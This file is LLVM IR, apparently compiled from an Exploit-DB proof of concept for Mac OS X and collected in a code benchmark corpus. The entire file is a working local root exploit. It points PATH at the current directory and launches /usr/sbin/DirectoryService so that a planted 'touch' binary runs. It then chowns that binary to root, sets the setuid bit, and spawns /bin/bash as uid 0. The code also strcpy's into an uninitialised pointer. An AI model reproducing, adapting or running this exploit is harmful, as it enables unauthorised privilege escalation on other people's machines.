; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_22483.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_22483.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [15 x i8] c"euid is root.\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"PATH\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"Original path: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"New path: %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [47 x i8] c"Executing DirectoryService with false PATH...\0A\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"/usr/sbin/DirectoryService\00", align 1
@.str.9 = private unnamed_addr constant [17 x i8] c"DirectoryService\00", align 1
@.str.10 = private unnamed_addr constant [55 x i8] c"Forked DirectoryService, pausing before shell exec...\0A\00", align 1
@.str.11 = private unnamed_addr constant [21 x i8] c"Cross your fingers.\0A\00", align 1
@.str.12 = private unnamed_addr constant [19 x i8] c"Path restored: %s\0A\00", align 1
@.str.13 = private unnamed_addr constant [8 x i8] c"./touch\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"touch\00", align 1
@.str.15 = private unnamed_addr constant [51 x i8] c"/usr/sbin/chown root ./touch;/bin/chmod +s ./touch\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %8, 2
  br i1 %9, label %10, label %40

10:                                               ; preds = %2
  %11 = call i64 (...) @geteuid()
  %12 = icmp eq i64 %11, 0
  br i1 %12, label %13, label %17

13:                                               ; preds = %10
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 @setuid(i32 0)
  %16 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32* null)
  br label %17

17:                                               ; preds = %13, %10
  %18 = load i8*, i8** %6, align 8
  %19 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %20 = call i32 @strcpy(i8* %18, i8* %19)
  %21 = load i8*, i8** %6, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i8* %21)
  %23 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i32 1)
  %24 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0), i8* %24)
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.7, i64 0, i64 0))
  %27 = call i64 (...) @fork()
  %28 = icmp eq i64 %27, 0
  br i1 %28, label %29, label %31

29:                                               ; preds = %17
  %30 = call i32 @execl(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0), i32* null)
  br label %31

31:                                               ; preds = %29, %17
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.10, i64 0, i64 0))
  %33 = call i32 @sleep(i32 3)
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0))
  %35 = load i8*, i8** %6, align 8
  %36 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* %35, i32 1)
  %37 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.12, i64 0, i64 0), i8* %37)
  %39 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0), i32* null)
  br label %40

40:                                               ; preds = %31, %2
  %41 = call i32 @system(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.15, i64 0, i64 0))
  %42 = load i32, i32* %3, align 4
  ret i32 %42
}

declare dso_local i64 @geteuid(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
